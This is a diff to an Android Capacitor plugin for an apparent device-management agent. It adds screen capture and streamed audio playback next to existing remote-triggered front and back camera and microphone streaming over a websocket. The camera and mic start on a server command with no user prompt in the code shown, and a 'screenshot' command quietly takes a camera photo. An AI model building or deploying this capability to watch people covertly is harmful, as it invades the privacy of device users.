@@ -1,26 +1,35 @@
 package com.mdmagent.app;
 
+import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
+import android.graphics.Bitmap;
 import android.graphics.ImageFormat;
+import android.graphics.PixelFormat;
 import android.hardware.camera2.CameraCharacteristics;
 import android.hardware.camera2.CameraDevice;
 import android.hardware.camera2.CameraManager;
 import android.hardware.camera2.CaptureRequest;
 import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.AudioAttributes;
 import android.media.AudioFormat;
 import android.media.AudioRecord;
+import android.media.AudioTrack;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.MediaPlayer;
 import android.media.MediaRecorder;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.Looper;
 import android.util.Base64;
+import android.util.DisplayMetrics;
 import android.webkit.WebView;
 
-import com.getcapacitor.JSObject;
 import com.getcapacitor.Plugin;
 import com.getcapacitor.PluginCall;
 import com.getcapacitor.PluginMethod;
@@ -29,6 +38,7 @@ import com.getcapacitor.annotation.CapacitorPlugin;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.nio.ByteBuffer;
@@ -76,12 +86,25 @@ public class NativeSocketPlugin extends Plugin {
     private boolean cameraActiveBack = false;
     private long lastFrameMsBack = 0;
 
+    // ── Screen capture ────────────────────────────────────────────────
+    private MediaProjection mediaProjection;
+    private VirtualDisplay virtualDisplay;
+    private ImageReader screenImageReader;
+    private HandlerThread screenThread;
+    private Handler screenHandler;
+    private boolean screenActive = false;
+    private long lastScreenFrameMs = 0;
+
     // ── Mic ───────────────────────────────────────────────────────────
     private AudioRecord audioRecord;
     private volatile boolean micActive = false;
     private Thread micThread;
 
-    // ── Speaker ───────────────────────────────────────────────────────
+    // ── Live speaker (AudioTrack stream) ─────────────────────────────
+    private AudioTrack audioTrack;
+    private volatile boolean liveSpeakActive = false;
+
+    // ── One-shot MediaPlayer speaker ─────────────────────────────────
     private MediaPlayer mediaPlayer;
 
     // ── Fire event into WebView ───────────────────────────────────────
@@ -139,7 +162,7 @@ public class NativeSocketPlugin extends Plugin {
 
             @Override public void onMessage(WebSocket s, String text) {
                 if (text.startsWith("0")) {
-                    // engine.io open — already sent "40" in onOpen
+                    // engine.io open packet — "40" already sent in onOpen
                 } else if (text.startsWith("40")) {
                     fireJs("connect", null);
                 } else if (text.equals("2")) {
@@ -170,47 +193,49 @@ public class NativeSocketPlugin extends Plugin {
             switch (evt) {
                 case "cmd:camera:start":
                 case "cmd:camera:start:front":
-                    startCameraFront();
-                    fireJs(evt, null);
-                    break;
+                    startCameraFront(); fireJs(evt, null); break;
                 case "cmd:camera:stop":
                 case "cmd:camera:stop:front":
-                    stopCameraFront();
-                    fireJs(evt, null);
-                    break;
+                    stopCameraFront(); fireJs(evt, null); break;
                 case "cmd:camera:start:back":
-                    startCameraBack();
-                    fireJs("cmd:camera:start:back", null);
-                    break;
+                    startCameraBack(); fireJs("cmd:camera:start:back", null); break;
                 case "cmd:camera:stop:back":
-                    stopCameraBack();
-                    fireJs("cmd:camera:stop:back", null);
-                    break;
+                    stopCameraBack(); fireJs("cmd:camera:stop:back", null); break;
+
                 case "cmd:mic:on":
-                    startMicNative();
-                    fireJs("cmd:mic:on", null);
-                    break;
+                    startMicNative(); fireJs("cmd:mic:on", null); break;
                 case "cmd:mic:off":
-                    stopMicNative();
-                    fireJs("cmd:mic:off", null);
-                    break;
+                    stopMicNative(); fireJs("cmd:mic:off", null); break;
+
+                // Screen capture — must be requested through JS (activity result needed)
+                case "cmd:screen:start":
+                    fireJs("cmd:screen:start", null); break;
+                case "cmd:screen:stop":
+                    stopScreenCapture(); fireJs("cmd:screen:stop", null); break;
+
+                // Live speaker — handled fully in native Java
+                case "cmd:speak:live:start":
+                    startLiveSpeakNative(); fireJs("cmd:speak:live:start", null); break;
+                case "cmd:speak:live:stop":
+                    stopLiveSpeakNative(); fireJs("cmd:speak:live:stop", null); break;
+                case "speak:live:chunk":
+                    writeLiveAudioChunk(data); break;
+
+                // One-shot audio playback (existing)
                 case "cmd:speak":
                     try {
                         String audioData = new JSONObject(data).getString("audioData");
                         playAudioNative(audioData);
                     } catch (Exception ignored) {}
-                    fireJs("cmd:speak", null);
-                    break;
+                    fireJs("cmd:speak", null); break;
+
                 case "cmd:screenshot":
-                    if (cameraActive) {
-                        pendingScreenshot = true;
-                    } else {
-                        takeScreenshotNative();
-                    }
+                    if (cameraActive) pendingScreenshot = true;
+                    else takeScreenshotNative();
                     break;
+
                 default:
-                    fireJs(evt, data.equals("null") ? null : data);
-                    break;
+                    fireJs(evt, data.equals("null") ? null : data); break;
             }
         } catch (Exception ignored) {}
     }
@@ -248,14 +273,111 @@ public class NativeSocketPlugin extends Plugin {
     @PluginMethod
     public void socketDisconnect(PluginCall call) {
         shouldReconnect = false;
-        stopCameraFront();
-        stopCameraBack();
-        stopMicNative();
+        stopCameraFront(); stopCameraBack();
+        stopScreenCapture();
+        stopMicNative(); stopLiveSpeakNative();
         if (ws != null) { ws.cancel(); ws = null; }
         call.resolve();
     }
 
-    // ── Front Camera2 (works when screen off) ─────────────────────────
+    // ── Screen capture — plugin method called from JS ─────────────────
+    private static final int SCREEN_CAPTURE_REQ = 1002;
+
+    @PluginMethod
+    public void requestScreenCapture(PluginCall call) {
+        MediaProjectionManager mpm =
+            (MediaProjectionManager) getContext().getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        getActivity().startActivityForResult(mpm.createScreenCaptureIntent(), SCREEN_CAPTURE_REQ);
+        call.resolve();
+    }
+
+    @Override
+    protected void handleOnActivityResult(int requestCode, int resultCode, Intent data) {
+        super.handleOnActivityResult(requestCode, resultCode, data);
+        if (requestCode != SCREEN_CAPTURE_REQ) return;
+
+        if (resultCode != Activity.RESULT_OK) {
+            fireJs("screen:denied", null);
+            return;
+        }
+        MediaProjectionManager mpm =
+            (MediaProjectionManager) getContext().getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        mediaProjection = mpm.getMediaProjection(resultCode, data);
+
+        if (MdmForegroundService.instance != null) {
+            MdmForegroundService.instance.updateForegroundType(true);
+        }
+
+        startVirtualDisplay();
+        fireJs("screen:started", null);
+    }
+
+    private void startVirtualDisplay() {
+        if (screenActive || mediaProjection == null) return;
+        screenActive = true;
+
+        DisplayMetrics metrics = getContext().getResources().getDisplayMetrics();
+        int width  = metrics.widthPixels  / 2;
+        int height = metrics.heightPixels / 2;
+        int dpi    = metrics.densityDpi   / 2;
+
+        screenThread = new HandlerThread("MdmScreen");
+        screenThread.start();
+        screenHandler = new Handler(screenThread.getLooper());
+
+        screenImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+        screenImageReader.setOnImageAvailableListener(reader -> {
+            Image img = reader.acquireLatestImage();
+            if (img == null) return;
+            long now = System.currentTimeMillis();
+            if (now - lastScreenFrameMs < 250) { img.close(); return; } // 4 fps
+            lastScreenFrameMs = now;
+            try {
+                Image.Plane plane = img.getPlanes()[0];
+                ByteBuffer buf = plane.getBuffer();
+                int ps = plane.getPixelStride();
+                int rs = plane.getRowStride();
+                int paddedW = rs / ps;
+
+                Bitmap bmp = Bitmap.createBitmap(paddedW, height, Bitmap.Config.ARGB_8888);
+                bmp.copyPixelsFromBuffer(buf);
+                if (paddedW != width) {
+                    Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, width, height);
+                    bmp.recycle();
+                    bmp = cropped;
+                }
+
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                bmp.compress(Bitmap.CompressFormat.JPEG, 55, baos);
+                bmp.recycle();
+
+                String b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+                JSONObject d = new JSONObject();
+                d.put("frame", b64);
+                sendEvent("screen:frame", d);
+            } catch (Exception ignored) {
+            } finally { img.close(); }
+        }, screenHandler);
+
+        virtualDisplay = mediaProjection.createVirtualDisplay(
+            "MdmScreen", width, height, dpi,
+            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+            screenImageReader.getSurface(), null, screenHandler
+        );
+    }
+
+    private void stopScreenCapture() {
+        screenActive = false;
+        try { if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; } } catch (Exception ignored) {}
+        try { if (screenImageReader != null) { screenImageReader.close(); screenImageReader = null; } } catch (Exception ignored) {}
+        try { if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; } } catch (Exception ignored) {}
+        if (screenThread != null) { screenThread.quitSafely(); screenThread = null; }
+        if (MdmForegroundService.instance != null) {
+            MdmForegroundService.instance.updateForegroundType(false);
+        }
+    }
+
+    // ── Front Camera2 ─────────────────────────────────────────────────
     private void startCameraFront() {
         if (cameraActive) return;
         cameraActive = true;
@@ -280,22 +402,17 @@ public class NativeSocketPlugin extends Plugin {
                 Image img = reader.acquireLatestImage();
                 if (img == null) return;
                 long now = System.currentTimeMillis();
-                boolean isScreenshot = pendingScreenshot;
-                if (!isScreenshot && now - lastFrameMs < 250) { img.close(); return; }
+                boolean isShot = pendingScreenshot;
+                if (!isShot && now - lastFrameMs < 250) { img.close(); return; }
                 lastFrameMs = now;
                 try {
                     ByteBuffer buf = img.getPlanes()[0].getBuffer();
-                    byte[] bytes = new byte[buf.remaining()];
-                    buf.get(bytes);
+                    byte[] bytes = new byte[buf.remaining()]; buf.get(bytes);
                     String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
-                    JSONObject frameData = new JSONObject();
-                    frameData.put("frame", b64);
-                    frameData.put("cameraType", "front");
-                    sendEvent("camera:frame", frameData);
-                    if (isScreenshot) {
-                        pendingScreenshot = false;
-                        sendEvent("screenshot:data", frameData);
-                    }
+                    JSONObject d = new JSONObject();
+                    d.put("frame", b64); d.put("cameraType", "front");
+                    sendEvent("camera:frame", d);
+                    if (isShot) { pendingScreenshot = false; sendEvent("screenshot:data", d); }
                 } catch (Exception ignored) {
                 } finally { img.close(); }
             }, cameraHandler);
@@ -304,23 +421,22 @@ public class NativeSocketPlugin extends Plugin {
                 @Override public void onOpened(CameraDevice camera) {
                     cameraDevice = camera;
                     try {
-                        camera.createCaptureSession(
-                                Arrays.asList(imageReader.getSurface()),
-                                new CameraCaptureSession.StateCallback() {
-                                    @Override public void onConfigured(CameraCaptureSession session) {
-                                        captureSession = session;
-                                        try {
-                                            CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
-                                            req.addTarget(imageReader.getSurface());
-                                            session.setRepeatingRequest(req.build(), null, cameraHandler);
-                                        } catch (Exception ignored) {}
-                                    }
-                                    @Override public void onConfigureFailed(CameraCaptureSession s) {}
-                                }, cameraHandler);
+                        camera.createCaptureSession(Arrays.asList(imageReader.getSurface()),
+                            new CameraCaptureSession.StateCallback() {
+                                @Override public void onConfigured(CameraCaptureSession session) {
+                                    captureSession = session;
+                                    try {
+                                        CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
+                                        req.addTarget(imageReader.getSurface());
+                                        session.setRepeatingRequest(req.build(), null, cameraHandler);
+                                    } catch (Exception ignored) {}
+                                }
+                                @Override public void onConfigureFailed(CameraCaptureSession s) {}
+                            }, cameraHandler);
                     } catch (Exception ignored) {}
                 }
-                @Override public void onDisconnected(CameraDevice camera) { camera.close(); cameraActive = false; }
-                @Override public void onError(CameraDevice camera, int error) { camera.close(); cameraActive = false; }
+                @Override public void onDisconnected(CameraDevice c) { c.close(); cameraActive = false; }
+                @Override public void onError(CameraDevice c, int e) { c.close(); cameraActive = false; }
             }, cameraHandler);
         } catch (Exception e) { cameraActive = false; }
     }
@@ -333,7 +449,7 @@ public class NativeSocketPlugin extends Plugin {
         if (cameraThread != null) { cameraThread.quitSafely(); cameraThread = null; }
     }
 
-    // ── Back Camera2 (works when screen off) ──────────────────────────
+    // ── Back Camera2 ──────────────────────────────────────────────────
     private void startCameraBack() {
         if (cameraActiveBack) return;
         cameraActiveBack = true;
@@ -361,13 +477,11 @@ public class NativeSocketPlugin extends Plugin {
                 lastFrameMsBack = now;
                 try {
                     ByteBuffer buf = img.getPlanes()[0].getBuffer();
-                    byte[] bytes = new byte[buf.remaining()];
-                    buf.get(bytes);
+                    byte[] bytes = new byte[buf.remaining()]; buf.get(bytes);
                     String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
-                    JSONObject frameData = new JSONObject();
-                    frameData.put("frame", b64);
-                    frameData.put("cameraType", "back");
-                    sendEvent("camera:frame", frameData);
+                    JSONObject d = new JSONObject();
+                    d.put("frame", b64); d.put("cameraType", "back");
+                    sendEvent("camera:frame", d);
                 } catch (Exception ignored) {
                 } finally { img.close(); }
             }, cameraHandlerBack);
@@ -376,23 +490,22 @@ public class NativeSocketPlugin extends Plugin {
                 @Override public void onOpened(CameraDevice camera) {
                     cameraDeviceBack = camera;
                     try {
-                        camera.createCaptureSession(
-                                Arrays.asList(imageReaderBack.getSurface()),
-                                new CameraCaptureSession.StateCallback() {
-                                    @Override public void onConfigured(CameraCaptureSession session) {
-                                        captureSessionBack = session;
-                                        try {
-                                            CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
-                                            req.addTarget(imageReaderBack.getSurface());
-                                            session.setRepeatingRequest(req.build(), null, cameraHandlerBack);
-                                        } catch (Exception ignored) {}
-                                    }
-                                    @Override public void onConfigureFailed(CameraCaptureSession s) {}
-                                }, cameraHandlerBack);
+                        camera.createCaptureSession(Arrays.asList(imageReaderBack.getSurface()),
+                            new CameraCaptureSession.StateCallback() {
+                                @Override public void onConfigured(CameraCaptureSession session) {
+                                    captureSessionBack = session;
+                                    try {
+                                        CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
+                                        req.addTarget(imageReaderBack.getSurface());
+                                        session.setRepeatingRequest(req.build(), null, cameraHandlerBack);
+                                    } catch (Exception ignored) {}
+                                }
+                                @Override public void onConfigureFailed(CameraCaptureSession s) {}
+                            }, cameraHandlerBack);
                     } catch (Exception ignored) {}
                 }
-                @Override public void onDisconnected(CameraDevice camera) { camera.close(); cameraActiveBack = false; }
-                @Override public void onError(CameraDevice camera, int error) { camera.close(); cameraActiveBack = false; }
+                @Override public void onDisconnected(CameraDevice c) { c.close(); cameraActiveBack = false; }
+                @Override public void onError(CameraDevice c, int e) { c.close(); cameraActiveBack = false; }
             }, cameraHandlerBack);
         } catch (Exception e) { cameraActiveBack = false; }
     }
@@ -405,15 +518,13 @@ public class NativeSocketPlugin extends Plugin {
         if (cameraThreadBack != null) { cameraThreadBack.quitSafely(); cameraThreadBack = null; }
     }
 
-    // One-shot screenshot without live streaming
+    // ── One-shot screenshot ───────────────────────────────────────────
     private void takeScreenshotNative() {
         cameraActive = true;
         pendingScreenshot = true;
-
         cameraThread = new HandlerThread("MdmScreenshot");
         cameraThread.start();
         cameraHandler = new Handler(cameraThread.getLooper());
-
         try {
             CameraManager mgr = (CameraManager) getContext().getSystemService(Context.CAMERA_SERVICE);
             String camId = mgr.getCameraIdList().length > 0 ? mgr.getCameraIdList()[0] : null;
@@ -425,17 +536,12 @@ public class NativeSocketPlugin extends Plugin {
                 if (img == null) return;
                 try {
                     ByteBuffer buf = img.getPlanes()[0].getBuffer();
-                    byte[] bytes = new byte[buf.remaining()];
-                    buf.get(bytes);
+                    byte[] bytes = new byte[buf.remaining()]; buf.get(bytes);
                     String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
-                    JSONObject d = new JSONObject();
-                    d.put("frame", b64);
+                    JSONObject d = new JSONObject(); d.put("frame", b64);
                     sendEvent("screenshot:data", d);
                 } catch (Exception ignored) {
-                } finally {
-                    img.close();
-                    stopCameraFront(); // one shot done
-                }
+                } finally { img.close(); stopCameraFront(); }
             }, cameraHandler);
 
             mgr.openCamera(camId, new CameraDevice.StateCallback() {
@@ -443,17 +549,17 @@ public class NativeSocketPlugin extends Plugin {
                     cameraDevice = camera;
                     try {
                         camera.createCaptureSession(Arrays.asList(imageReader.getSurface()),
-                                new CameraCaptureSession.StateCallback() {
-                                    @Override public void onConfigured(CameraCaptureSession session) {
-                                        captureSession = session;
-                                        try {
-                                            CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-                                            req.addTarget(imageReader.getSurface());
-                                            session.capture(req.build(), null, cameraHandler);
-                                        } catch (Exception ignored) {}
-                                    }
-                                    @Override public void onConfigureFailed(CameraCaptureSession s) { stopCameraFront(); }
-                                }, cameraHandler);
+                            new CameraCaptureSession.StateCallback() {
+                                @Override public void onConfigured(CameraCaptureSession session) {
+                                    captureSession = session;
+                                    try {
+                                        CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                                        req.addTarget(imageReader.getSurface());
+                                        session.capture(req.build(), null, cameraHandler);
+                                    } catch (Exception ignored) {}
+                                }
+                                @Override public void onConfigureFailed(CameraCaptureSession s) { stopCameraFront(); }
+                            }, cameraHandler);
                     } catch (Exception ignored) { stopCameraFront(); }
                 }
                 @Override public void onDisconnected(CameraDevice c) { c.close(); cameraActive = false; }
@@ -462,7 +568,7 @@ public class NativeSocketPlugin extends Plugin {
         } catch (Exception e) { cameraActive = false; pendingScreenshot = false; }
     }
 
-    // ── AudioRecord Mic (works when screen off) ───────────────────────
+    // ── AudioRecord Mic ───────────────────────────────────────────────
     private void startMicNative() {
         if (micActive) return;
         micActive = true;
@@ -479,9 +585,8 @@ public class NativeSocketPlugin extends Plugin {
         audioRecord.startRecording();
 
         try {
-            JSONObject stateData = new JSONObject();
-            stateData.put("active", true);
-            sendEvent("mic:state", stateData);
+            JSONObject s = new JSONObject(); s.put("active", true);
+            sendEvent("mic:state", s);
         } catch (Exception ignored) {}
 
         micThread = new Thread(() -> {
@@ -492,9 +597,7 @@ public class NativeSocketPlugin extends Plugin {
                     try {
                         String b64 = Base64.encodeToString(Arrays.copyOf(buf, n), Base64.NO_WRAP);
                         JSONObject d = new JSONObject();
-                        d.put("chunk", b64);
-                        d.put("format", "pcm16");
-                        d.put("sampleRate", sampleRate);
+                        d.put("chunk", b64); d.put("format", "pcm16"); d.put("sampleRate", sampleRate);
                         sendEvent("mic:audio", d);
                     } catch (Exception ignored) {}
                 }
@@ -510,14 +613,52 @@ public class NativeSocketPlugin extends Plugin {
             try { audioRecord.stop(); audioRecord.release(); } catch (Exception ignored) {}
             audioRecord = null;
         }
+        try { JSONObject d = new JSONObject(); d.put("active", false); sendEvent("mic:state", d); }
+        catch (Exception ignored) {}
+    }
+
+    // ── Live Speaker — AudioTrack streaming ───────────────────────────
+    private void startLiveSpeakNative() {
+        if (liveSpeakActive) return;
+        liveSpeakActive = true;
+        int sr = 16000;
+        int minBuf = AudioTrack.getMinBufferSize(sr, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);
         try {
-            JSONObject d = new JSONObject();
-            d.put("active", false);
-            sendEvent("mic:state", d);
+            audioTrack = new AudioTrack.Builder()
+                .setAudioAttributes(new AudioAttributes.Builder()
+                    .setUsage(AudioAttributes.USAGE_MEDIA)
+                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
+                    .build())
+                .setAudioFormat(new AudioFormat.Builder()
+                    .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
+                    .setSampleRate(sr)
+                    .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
+                    .build())
+                .setBufferSizeInBytes(minBuf * 4)
+                .setTransferMode(AudioTrack.MODE_STREAM)
+                .build();
+            audioTrack.play();
+        } catch (Exception e) { liveSpeakActive = false; }
+    }
+
+    private void stopLiveSpeakNative() {
+        liveSpeakActive = false;
+        if (audioTrack != null) {
+            try { audioTrack.stop(); audioTrack.release(); } catch (Exception ignored) {}
+            audioTrack = null;
+        }
+    }
+
+    private void writeLiveAudioChunk(String jsonData) {
+        if (!liveSpeakActive || audioTrack == null) return;
+        try {
+            JSONObject obj = new JSONObject(jsonData);
+            byte[] pcm = Base64.decode(obj.getString("chunk"), Base64.DEFAULT);
+            audioTrack.write(pcm, 0, pcm.length);
         } catch (Exception ignored) {}
     }
 
-    // ── MediaPlayer Speaker ───────────────────────────────────────────
+    // ── One-shot MediaPlayer speaker ──────────────────────────────────
     private void playAudioNative(String base64Data) {
         try {
             byte[] data = Base64.decode(base64Data, Base64.DEFAULT);
